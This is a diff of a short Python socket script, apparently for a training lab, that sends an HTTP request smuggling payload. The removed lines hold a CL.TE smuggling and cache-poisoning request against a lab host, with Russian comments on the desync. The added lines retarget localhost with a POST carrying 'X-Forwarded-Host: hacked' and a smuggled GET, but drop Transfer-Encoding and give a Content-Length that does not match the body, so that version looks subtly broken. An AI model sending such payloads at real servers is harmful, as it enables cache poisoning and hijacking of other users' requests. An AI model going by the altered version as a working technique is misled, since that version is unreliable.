@@ -1,31 +1,22 @@
 
 import socket
 
-host = "lap3-http_request_smuggling_cache_poison.labs-is-here.online"
-port = 80
+HOST = '127.0.0.1'  # Адрес твоего сервера
+PORT = 8000         # Порт (если Flask dev-сервер, то 5000)
 
-# 1) front-end читает по Content-Length (13 байт)
-# 2) back-end читает по Transfer-Encoding: chunked
-#    → всё, что идёт после завершающего 0-чанка,
-#      попадает на back-end как отдельный запрос
 payload = (
-    "POST /last_post HTTP/1.1\r\n"
-    f"Host: {host}\r\n"
-    "Content-Length: 13\r\n"         # 13 байт «тела» для front-end
-    "Transfer-Encoding: chunked\r\n"
-    "Connection: keep-alive\r\n"
+    "POST /post/1 HTTP/1.1\r\n"
+    "Host: vuln.lab\r\n"
+    "Content-Length: 19\r\n"
+    "X-Forwarded-Host: hacked\r\n"
     "\r\n"
-    "0\r\n"                          # 5 байт
-    "\r\n"
-    "XXXXXX\r\n"                     # 8 байт → 5+8 = 13
-    "\r\n"
-    "GET /last_post HTTP/1.1\r\n"    # <-- вторая просьба для back-end
-    f"Host: {host}\r\n"
-    "X-Smuggle-Poison: 1\r\n"
+    "body=YOUAREHACKED!!!"
+    "GET /last_post HTTP/1.1\r\n"
+    "Host: vuln.lab\r\n"
     "\r\n"
 )
 
-with socket.create_connection((host, port)) as s:
+with socket.create_connection((HOST, PORT)) as s:
     s.sendall(payload.encode())
-    print(s.recv(4096).decode(errors="ignore"))
+    print(s.recv(4096).decode())
 
